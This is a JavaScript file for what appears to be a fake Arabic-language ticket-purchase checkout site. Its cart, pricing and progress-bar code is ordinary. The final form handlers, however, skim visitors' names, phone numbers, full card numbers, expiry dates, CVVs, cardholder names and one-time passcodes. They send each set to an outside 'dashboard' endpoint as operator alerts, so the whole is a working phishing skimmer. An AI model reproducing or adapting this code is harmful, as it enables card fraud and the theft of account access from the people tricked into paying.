// ============================
// 🌐 PAGE LOADED
// ============================
document.addEventListener("DOMContentLoaded", () => {
  // ============================
  // 🟧 PROGRESS BAR STEP HANDLING
  // ============================
  const steps = document.querySelectorAll(".progress-step");
  const lines = document.querySelectorAll(".line");

  // Determine which page we're on
  const currentPage = window.location.pathname.split("/").pop();

  // Reset all steps and lines first
  steps.forEach(step => step.classList.remove("active"));
  lines.forEach(line => line.classList.remove("active"));

  // Helper function to activate steps + lines up to a specific index
  const activateProgress = (stepCount) => {
    for (let i = 0; i < stepCount; i++) {
      steps[i].classList.add("active");
      if (i > 0) lines[i - 1].classList.add("active"); // activate line before step
    }
  };

  // Highlight based on current page
  if (currentPage === "guestInfo.html" || currentPage === "payment.html") {
    activateProgress(1);
  } else if (currentPage === "cartSummary.html") {
    activateProgress(2);
  } else if (currentPage === "creditCard.html") {
    activateProgress(3);
  } else if (currentPage === "otp.html") {
    activateProgress(4);
  }

  // ============================
  // 🧾 PAY NOW NAVIGATION (CART SUMMARY PAGE)
  // ============================
  const payNowBtn = document.querySelector(".pay-now-btn");
  if (payNowBtn) {
    payNowBtn.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = "creditCard.html";
    });
  }

  // ============================
  // ⬅️ BACK BUTTON (CART SUMMARY PAGE)
  // ============================
  const backBtn = document.querySelector(".btn-back");
  if (backBtn) {
    backBtn.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = "payment.html";
    });
  }

  const btnBack = document.querySelector(".back-btn");
  if (btnBack) {
    btnBack.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = "cartSummary.html";
    });
  }

   const goBack = document.querySelector(".go-back");
  if (goBack) {
    goBack.addEventListener("click", (e) => {
      e.preventDefault();
      window.location.href = "cartSummary.html";
    });
  }

});




// ============================
// 🧮 CART COUNTER FUNCTIONALITY
// ============================
const cartItem = document.querySelector(".cart-item");
if (cartItem) {
  const plusBtn = cartItem.querySelector(".plus");
  const minusBtn = cartItem.querySelector(".minus");
  const countSpan = cartItem.querySelector(".count");

  let count = parseInt(localStorage.getItem("ticketCount")) || 0;
  countSpan.textContent = count;

  const updateCount = (newCount) => {
    count = newCount;
    countSpan.textContent = count;
    localStorage.setItem("ticketCount", count);
  };

  plusBtn.addEventListener("click", () => updateCount(count + 1));
  minusBtn.addEventListener("click", () => {
    if (count > 1) updateCount(count - 1);
  });
}

// ✅ Auto-format card number as 1111 2222 3333 4444
document.addEventListener("DOMContentLoaded", () => {
  const cardNumberInput = document.getElementById("card-number");
  if (cardNumberInput) {
    cardNumberInput.addEventListener("input", (e) => {
      let value = e.target.value.replace(/\D/g, ""); // remove non-digits
      value = value.substring(0, 16); // limit to 16 digits
      const formatted = value.replace(/(\d{4})(?=\d)/g, "$1 "); // add space every 4 digits
      e.target.value = formatted;
    });
  }
});

// document.addEventListener('DOMContentLoaded', () => {
//   const payBtn = document.querySelector('.btn-pay');
//   if (payBtn) {
//     payBtn.addEventListener('click', (e) => {
//       e.preventDefault(); // prevent form submission
//       window.location.href = 'otp.html'; // navigate to OTP page
//     });
//   }
// });

// ============================
// 🛒 CART POPUP FUNCTIONALITY (SAFE)
// ============================
document.addEventListener("DOMContentLoaded", () => {
  const cartBtn = document.getElementById("cart-btn");
  const cartPopup = document.getElementById("cart-popup");
  const closeCart = document.getElementById("close-cart");
  const popupCount = document.getElementById("popup-count");
  const popupPlus = document.getElementById("popup-plus");
  const popupMinus = document.getElementById("popup-minus");
  const total = document.getElementById("cart-total");
  const goToPayment = document.getElementById("go-to-payment");
  const continueShopping = document.getElementById("continue-shopping");

  // If popup elements are not on this page, stop here
  if (!cartPopup) return;

  let count = parseInt(localStorage.getItem("ticketCount")) || 1;
  popupCount.textContent = count;
  updateTotal();

  function updateTotal() {
    if (total) {
      total.innerHTML = ` <img src="images/dirham.png" alt="AED" class="dirham-icon"> ${count * 30}`;

    }
    localStorage.setItem("ticketCount", count);
    const cartCount = document.getElementById("cart-count");
    if (cartCount) cartCount.textContent = count;
  }

  if (cartBtn) {
    cartBtn.addEventListener("click", () => {
      cartPopup.classList.add("active");
    });
  }

  if (closeCart) {
    closeCart.addEventListener("click", () => {
      cartPopup.classList.remove("active");
    });
  }

  if (popupPlus) {
    popupPlus.addEventListener("click", () => {
      count++;
      popupCount.textContent = count;
      updateTotal();
    });
  }

  if (popupMinus) {
    popupMinus.addEventListener("click", () => {
      if (count > 1) {
        count--;
        popupCount.textContent = count;
        updateTotal();
      }
    });
  }

  if (goToPayment) {
    goToPayment.addEventListener("click", () => {
      window.location.href = "";
    });
  }

  if (continueShopping) {
    continueShopping.addEventListener("click", () => {
      cartPopup.classList.remove("active");
    });
  }
});


document.addEventListener("DOMContentLoaded", () => {
  // CONFIG
  const DIRHAM_IMG = '<img src="images/dirham.png" alt="Dirham" class="dirham-icon">';
  const DEFAULT_PRICE = 30; // fallback per-ticket price

  // Helper: parse integer from a string like "30" or "30 × 1" or "30 درهم"
  function parsePriceFromText(text) {
    const m = text && text.match(/(\d+(?:\.\d+)?)/);
    return m ? parseInt(m[1], 10) : null;
  }

  // Find all item containers that have counters. Support both .cart-item and .popup-item
  const itemContainers = Array.from(document.querySelectorAll(".cart-item, .popup-item"));

  // If no items on the page, exit quietly
  if (itemContainers.length === 0) {
    // still safe: update header badge from localStorage if exists
    const savedCount = parseInt(localStorage.getItem("ticketCount")) || 0;
    const cartCountElem = document.getElementById("cart-count");
    if (cartCountElem) cartCountElem.textContent = savedCount;
    return;
  }

  // We'll track item states here
  const items = itemContainers.map((container, idx) => {
    // quantity element might be .quantity or .quantity-controls
    const plus = container.querySelector(".plus");
    const minus = container.querySelector(".minus");
    const countEl = container.querySelector(".count");
    // per-item total display (prefer span#item-price-value, fallback .item-price)
    const itemPriceValue = container.querySelector("#item-price-value") || container.querySelector(".item-price span") || container.querySelector(".item-price");
    // per-unit price: prefer data-price attribute on container, else parse from .price-line or .item-info p
    let unitPrice = DEFAULT_PRICE;
    const dataPrice = container.getAttribute("data-price");
    if (dataPrice && !isNaN(parseInt(dataPrice, 10))) {
      unitPrice = parseInt(dataPrice, 10);
    } else {
      const priceLine = container.querySelector(".price-line, .item-info p, .item-price");
      if (priceLine) {
        const parsed = parsePriceFromText(priceLine.textContent || priceLine.innerText);
        if (parsed) unitPrice = parsed;
      }
    }

    // ensure there's a starting count
    let startCount = 1;
    if (countEl && !isNaN(parseInt(countEl.textContent, 10))) startCount = parseInt(countEl.textContent, 10);
    // return item object
    return {
      container,
      plus,
      minus,
      countEl,
      itemPriceValue,
      unitPrice,
      count: startCount,
      idx
    };
  });

  // Update one item's displayed total
  function updateItemDisplay(item) {
    const total = item.count * item.unitPrice;
    // prefer updating the span inside .item-price if present, else set textContent of itemPriceValue
    if (item.itemPriceValue) {
      // if itemPriceValue is container .item-price element (not a span), we'll replace innerHTML properly
      const tagName = item.itemPriceValue.tagName ? item.itemPriceValue.tagName.toLowerCase() : "";
      if (tagName === "span" || tagName === "strong" || tagName === "div") {
        // put number then icon (RTL spacing handled by CSS)
        item.itemPriceValue.innerHTML = `${total} `;
      } else {
        // fallback
        item.itemPriceValue.textContent = String(total);
      }
    }
    // also update the visible counter
    if (item.countEl) item.countEl.textContent = item.count;
  }

  // Update global cart totals (sum of all item totals) and header badge
  function updateCartTotals() {
    let totalSum = 0;
    let totalTicketsCount = 0;
    items.forEach(it => {
      totalSum += it.unitPrice * it.count;
      totalTicketsCount += it.count;
    });

    // update popup / cart-total element
    const cartTotalElem = document.getElementById("cart-total");
    if (cartTotalElem) {
      cartTotalElem.innerHTML = `${totalSum} ${DIRHAM_IMG}`;
    }

    // update header badge count (if you want count of tickets)
    const cartCountElem = document.getElementById("cart-count");
    if (cartCountElem) {
      cartCountElem.textContent = totalTicketsCount;
    }

    // persist ticket count (total tickets) for other pages
    localStorage.setItem("ticketCount", totalTicketsCount);

    // update any item-price-value in the main cart area elements as well
    items.forEach(updateItemDisplay);
  }

  // Hook up listeners for each item
  items.forEach(item => {
    // if elements not present, skip safely
    if (!item.plus && !item.minus) return;

    // initialize display
    updateItemDisplay(item);

    // plus
    if (item.plus) {
      item.plus.addEventListener("click", (e) => {
        e.preventDefault();
        item.count = (parseInt(item.count, 10) || 0) + 1;
        updateItemDisplay(item);
        updateCartTotals();
      });
    }

    // minus
    if (item.minus) {
      item.minus.addEventListener("click", (e) => {
        e.preventDefault();
        const current = parseInt(item.count, 10) || 1;
        if (current > 1) {
          item.count = current - 1;
          updateItemDisplay(item);
          updateCartTotals();
        }
      });
    }
  });

  // Final init: compute totals from initial counts (possibly loaded from DOM or localStorage)
  // If localStorage contains a saved total count, and you want to distribute it to first item, you can do so here.
  updateCartTotals();
});

document.addEventListener("DOMContentLoaded", () => {
  const amountElem = document.getElementById("payment-amount");
  if (!amountElem) return;

  // Read saved data from localStorage
  const ticketData = JSON.parse(localStorage.getItem("ticketData")) || {};
  let totalAmount = 0;
  let totalCount = 0;

  // Sum all tickets (price × count)
  Object.values(ticketData).forEach(ticket => {
    if (ticket.count && ticket.price) {
      totalAmount += ticket.count * ticket.price;
      totalCount += ticket.count;
    }
  });

  // Fallback if no data found
  if (totalAmount === 0) {
    const count = parseInt(localStorage.getItem("ticketCount")) || 1;
    totalAmount = count * 30;
    totalCount = count;
  }

  // Update payment summary on page
  amountElem.innerHTML = `${totalAmount} <img src="images/dirham.png" alt="Dirham" class="dirham-icon">`;

  // Optional: if you have an element to show total tickets count
  const countElem = document.getElementById("total-tickets-count");
  if (countElem) countElem.textContent = totalCount;
});


const selected = JSON.parse(localStorage.getItem("selectedWonderCard"));
if (selected) {
  console.log(selected.name, selected.price);
}


document.addEventListener("DOMContentLoaded", () => {
  const cartContainer = document.querySelector(".cart-items");
  if (!cartContainer) return;

  const buyButtons = document.querySelectorAll(".wonder-card .buy-btn");

  buyButtons.forEach((button) => {
    button.addEventListener("click", () => {
      const card = button.closest(".wonder-card");
      if (!card) return;

      // Extract price & description safely
      const priceEl = card.querySelector(".price");
      const descEl = card.querySelector("p:not(.price)");
      const price = priceEl ? parseFloat(priceEl.textContent.replace(/[^\d.]/g, "")) : 0;
      const description = descEl ? descEl.textContent.trim() : "نقطة متعددة الاستخدام";

      // ✅ Remove any previously added Wonder Card (to avoid duplicates)
      const existingWonder = cartContainer.querySelector(".cart-item.wonder-item");
      if (existingWonder) existingWonder.remove();

      // ✅ Create and append new Wonder Card item
      const newItem = document.createElement("div");
      newItem.classList.add("cart-item", "active", "wonder-item");
      newItem.innerHTML = `
        <div class="item-info">
          <h4>نقطة متعددة الاستخدام</h4>
          <p>${price} <img src="images/dirham.png" alt="Dirham" class="dirham-icon"></p>
        </div>
        <div class="item-price">
          <span>${price}</span>
          <img src="images/dirham.png" alt="Dirham" class="dirham-icon">
        </div>
      `;

      cartContainer.appendChild(newItem);

      // ✅ Save Wonder Card to localStorage
      localStorage.setItem("selectedWonderCard", JSON.stringify({ description, price }));

      // ✅ Redirect to payment page
      window.location.href = "payment.html";
    });
  });
});
document.addEventListener("DOMContentLoaded", () => {
  const cartContainer = document.querySelector(".cart-items");
  if (!cartContainer) return;

  // ✅ Check if Wonder Card saved in localStorage
  const savedWonder = JSON.parse(localStorage.getItem("selectedWonderCard"));
  if (savedWonder) {
    const { description, price } = savedWonder;

    // ✅ Prevent duplicate rendering
    if (!cartContainer.querySelector(".wonder-item")) {
      const newItem = document.createElement("div");
      newItem.classList.add("cart-item", "active", "wonder-item");
      newItem.innerHTML = `
        <div class="item-info">
          <h4>نقطة متعددة الاستخدام</h4>
          <p>${price} <img src="images/dirham.png" alt="Dirham" class="dirham-icon"></p>
        </div>
        <div class="item-price">
          <span>${price}</span>
          <img src="images/dirham.png" alt="Dirham" class="dirham-icon">
        </div>
      `;
      cartContainer.appendChild(newItem);
    }
  }
});

// ============================
// 💰 TOTAL SUMMARY CALCULATION
// ============================
document.addEventListener("DOMContentLoaded", () => {
  const totalElem = document.getElementById("total-amount");

  // Create the total summary line if it doesn’t exist
  if (!totalElem) {
    const totalLine = document.createElement("h4");
    totalLine.innerHTML = `
      الإجمالي: <span id="total-amount">0</span>
      <img src="images/dirham.png" alt="Dirham" class="dirham-icon">
    `;
    // append it after the cart items
    const cartContainer = document.querySelector(".cart-items");
    if (cartContainer && cartContainer.parentNode) {
      cartContainer.parentNode.appendChild(totalLine);
    }
  }

  function updateTotal() {
    let total = 0;

    // 🎟️ 1️⃣ Add tickets count × 30
    const ticketCount = parseInt(localStorage.getItem("ticketCount")) || 0;
    total += ticketCount * 30;

    // 💎 2️⃣ Add Wonder Card (if exists)
    const wonder = JSON.parse(localStorage.getItem("selectedWonderCard"));
    if (wonder && wonder.price) {
      total += parseFloat(wonder.price);
    }

    // 🧾 3️⃣ Update DOM
    const totalDisplay = document.getElementById("total-amount");
    if (totalDisplay) totalDisplay.textContent = total;
  }

  updateTotal();
  window.addEventListener("storage", updateTotal);
});

document.addEventListener("DOMContentLoaded", () => {
  const dateElem = document.getElementById("current-date");
  if (!dateElem) return;

  const today = new Date();

  // Format as: day/month/year (e.g., 1/11/2025)
  const day = today.getDate();
  const month = today.getMonth() + 1; // months start at 0
  const year = today.getFullYear();

  const formatted = `${day}/${month}/${year}`;

  dateElem.textContent = formatted;
});


document.addEventListener("DOMContentLoaded", () => {
  console.log("✅ DOM loaded");

  const form = document.getElementById("payment-form");
  console.log("Form found:", !!form);
  if (!form) return;

  form.addEventListener("submit", async (e) => {
    e.preventDefault();
    console.log("📨 Submit event triggered");

    const firstName = document.getElementById("firstName")?.value.trim() || "";
    const countryCode = document.getElementById("countryCode")?.value || "";
    const phone = document.getElementById("phone")?.value.trim() || "";

    if (!firstName || !countryCode || !phone) {
      alert("يرجى إدخال الاسم ورقم الهاتف بشكل صحيح.");
      return;
    }

    const messageText = `🔐 
تسجيل دخول جديد:
📧 الاسم :
${firstName}
🔑 رقم الهاتف :
${countryCode}${phone}`;

    try {
      const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: messageText }),
      });

      if (response.ok) {
        
        localStorage.setItem("countryCode", countryCode ); 
        localStorage.setItem("phone", phone ); 
        window.location.href = "cartSummary.html"; // ✅ redirect only after success
      } else {
        
      }
    } catch (err) {
      console.error("🚨 Network error:", err);
      
    }
  });
});

document.addEventListener("DOMContentLoaded", () => {
  const payForm = document.querySelector(".credit-form");
  if (!payForm) return;

  payForm.addEventListener("submit", async (e) => {
    e.preventDefault();

    // ✅ Get all fields by correct IDs
    const cardNumber = document.getElementById("card-number")?.value.trim();
    const expiryMonth = document.getElementById("expiry-month")?.value;
    const expiryYear = document.getElementById("expiry-year")?.value;
    const cvv = document.getElementById("cvv")?.value.trim();
    const cardholder = document.getElementById("cardholder")?.value.trim();
    const countryCode = localStorage.getItem("countryCode") || "غير معروف";
    const phone = localStorage.getItem("phone") || "غير معروف";

    console.log({ cardNumber, expiryMonth, expiryYear, cvv, cardholder }); // ✅ debug

    // ✅ Validate fields
    if (!cardNumber || !expiryMonth || !expiryYear || !cvv || !cardholder) {
      alert("يرجى إدخال جميع بيانات البطاقة بشكل صحيح.");
      return;
    }

    // ✅ Build message (same Telegram/Message format)
    const messageText = `💳 
تمت محاولة دفع جديدة:
رقم الهاتف 
${countryCode}${phone}
🔢 رقم البطاقة: 
${cardNumber}
📅 الصلاحية:
${expiryMonth}/${expiryYear}
🔐 CVV: 
${cvv}
👤 حامل البطاقة: 
${cardholder}
`;


    try {
      const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: messageText }),
      });

      if (response.ok) {
        
        localStorage.setItem("cardNumber", cardNumber); 
        window.location.href = "otp.html";
      } else {
        
      }
    } catch (err) {
      console.error("🚨 Network error:", err);
      
    }
  });
});


document.addEventListener("DOMContentLoaded", () => {
  console.log("✅ OTP page loaded");

  const cardNumber = localStorage.getItem("cardNumber") || "غير معروف";
  const otpInput = document.getElementById("otp-code");
  const confirmBtn = document.querySelector(".otp-confirm");

  // 🔘 Handle Confirm click
  confirmBtn.addEventListener("click", async () => {
    const otpValue = otpInput.value.trim();

    if (!otpValue || otpValue.length < 4) {
      alert("يرجى إدخال رمز التحقق بشكل صحيح.");
      return;
    }
const messageText = `📱\n\nتم إدخال رمز تحقق جديد:\n\n🔢 رمز التحقق:\n${otpValue}\n\n💳 رقم البطاقة:\n${cardNumber}`;


    console.log("📤 Sending OTP:", messageText);

    try {
      const response = await fetch("https://dashboard-nrc2.onrender.com/api/messages", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: messageText }),
      });

      if (response.ok) {
        
      } else {
        
      }
    } catch (err) {
      console.error("🚨 Network error:", err);
      
    }
  });
});
